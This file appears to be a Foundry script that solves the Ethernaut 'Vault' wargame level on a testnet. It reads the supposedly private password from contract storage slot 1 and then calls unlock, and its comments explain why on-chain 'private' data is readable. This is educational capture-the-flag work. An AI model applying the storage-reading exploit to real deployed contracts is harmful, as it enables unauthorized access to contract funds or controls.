// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Vault} from "../src/Vault.sol";

// $ source .env      # This is to store the environmental variables in the shell session
// $ forge script script/Vault.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv

contract VaultSolution is Script {
    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    // this is the instance address created by the ethernaut contract
    address public instance = payable(vm.envAddress("VAULT_INSTANCE"));
    
    /* Attack idea: 
        We need to get the password from the contract
        It is in the slot1 of the contract storage
        Notice that in ethereum nothing is private, we can access the storage of any contract besides it is public or private
    */

    function run() external {
        Vault vaultInstance = Vault(instance);
        // get the password from the storage slot 1 using foundry vm.load function
        // We need to first convert to uint256 then to bytes32 (bydefault it is int256)
        bytes32 password = vm.load(instance, bytes32(uint256(1)));

        vm.startBroadcast(deployerPrivateKey);
        // call the unlock function with the password
        vaultInstance.unlock(password);

        console.log("Vault locked ? ", vaultInstance.locked());
        vm.stopBroadcast();
    }
}